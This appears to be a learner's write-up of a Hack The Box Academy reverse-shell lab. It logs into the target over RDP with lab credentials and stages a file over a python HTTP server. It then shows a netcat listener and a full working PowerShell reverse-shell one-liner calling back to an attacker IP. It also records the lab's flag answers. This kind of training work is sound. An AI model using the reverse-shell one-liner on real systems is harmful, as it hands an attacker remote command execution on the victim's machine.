### Reverse Shell Exercise
 
IP: 10.129.108.34
 
---
 
### Question 1:
When establishing a reverse shell session with a target, will the target act as a client or server?
 
If you're establishing a reverse shell, then the target is reaching out to your local machine, making the connection, which makes them the client, and your local machine act as the server it's connecting to.
 
&#x1F6A9; found **Client**.
 
---
 
### Question 2:
Connect to the target via RDP and establish a reverse shell session with your attack box, then submit the hostname of the target box.
 
I start off by connecting to RDP using xfreerdp and the credentials given to me by the section.
 
```diff
+ $ xfreerdp /v:10.129.108.34 /u:htb-student /p:HTB_@cademy_stdnt!
```
 
Once connected, I can see that there's no internet connection, so I can't look up instances of reverse shells. To avoid messing up the command, I host an HTTP server on my local machine hosting a file containing the command and download it in the RDP session.
 
```diff
+ $ nvim test.txt
+ $ mkdir temp
+ $ mv test.txt temp/
+ $ cd temp
+ $ python3 -m http.server
```
 
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
	10.129.108.34 - - [18/Aug/2026 20:06:16] "GET /test.txt HTTP/1.1" 200 -
 
On my RDP machine, I download the file like so.
 
```diff
+ PS C:\Users\htb-student> (New-Object Net.WebClient).DownloadFile('http://10.10.14.75:8000/test.txt','C:\Users\Public\test.txt')
```
 
Now with this, I copy and paste into my terminal, ensuring the IP matches with the local machine and that I have a listener running to catch the connection.
 
```diff
+ $ sudo nc -lvnp 443
```
 
	Listening on 0.0.0.0 443
 
```diff
+ PS C:\Users\htb-student> $client = New-Object System.Net.Sockets.TCPClient('10.10.14.75',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
 
On my local machine, I can see that my listener caught the connection.
 
	Connection received on 10.129.108.34 49878
	PS C:\Users\htb-student>
 
From here I run the command hostname to do as it implies.
 
```diff
+ PS C:\Users\htb-student> hostname
```
 
	Shells-Win10
 
&#x1F6A9; found **Shells-Win10**.
 
